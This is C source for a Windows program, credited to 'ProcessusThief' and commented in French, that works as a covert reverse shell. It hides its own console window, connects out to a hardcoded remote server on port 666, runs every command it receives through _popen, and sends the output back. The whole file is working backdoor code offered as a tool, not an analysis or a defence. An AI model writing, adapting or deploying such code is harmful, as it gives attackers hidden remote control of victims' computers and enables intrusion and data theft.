typedef int socklen_t;
#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#define _WIN32_WINNT 0x0500
#include <windows.h>


// Informations du serveur
#define PORT 666
#define SERVER "8.8.8.8"



/*
*	@author ProcessusThief
*	@version 1.4
*
*	Fix missing :
*	->	chaque commande est exécutée dans un process différent
*		on a donc pas de continuité dans les commandes (déplacements de répertoires... etc)
*		Contournement : envoyer plusieurs commandes dans un fichier, puis exécuter le script
*/


int main(void)
{
	// on cache la console au lancement
	HWND hWnd = GetConsoleWindow();
	ShowWindow(hWnd, SW_MINIMIZE);
	ShowWindow(hWnd, SW_HIDE);


	// création de l'objet socket
	WSADATA WSAData;
	int erreur = WSAStartup(MAKEWORD(2, 2), &WSAData);

	SOCKET sock;
	SOCKADDR_IN sin;
	char buffer[999] = "";

	if (!erreur)
	{
		// Création de la socket 
		sock = socket(AF_INET, SOCK_STREAM, 0);

		// Configuration de la connexion
		sin.sin_addr.s_addr = inet_addr(SERVER);
		sin.sin_family = AF_INET;
		sin.sin_port = htons(PORT);

		// Si l'on a réussi à se connecter
		if (connect(sock, (SOCKADDR*)& sin, sizeof(sin)) != SOCKET_ERROR)
		{
			// tant que la socket est active si on reçoit une requête
			while (recv(sock, buffer, 999, 0) != SOCKET_ERROR) {
				
				FILE* fp;
				char path[999];

				// on exécute la commande contenue dans le buffer
				// on utilise _popen plutot que system afin de recuperer l'output
				fp = _popen(buffer, "r");

				// on réinitialise le buffer pour renvoyer le résultat
				char buffer[9999] = "";
				while (fgets(path, sizeof(path) - 1, fp) != NULL) {
					// on concatène chaque ligne de retour
					strcat(buffer, path);
				}

				// on renvoit le résultat
				send(sock, buffer, strlen(buffer)+1, 0);

				// on ferme le process
				_pclose(fp);
				
			}
		}

		// fermeture de la connexion socket
		closesocket(sock);
		WSACleanup();
	}
	return 0;
}
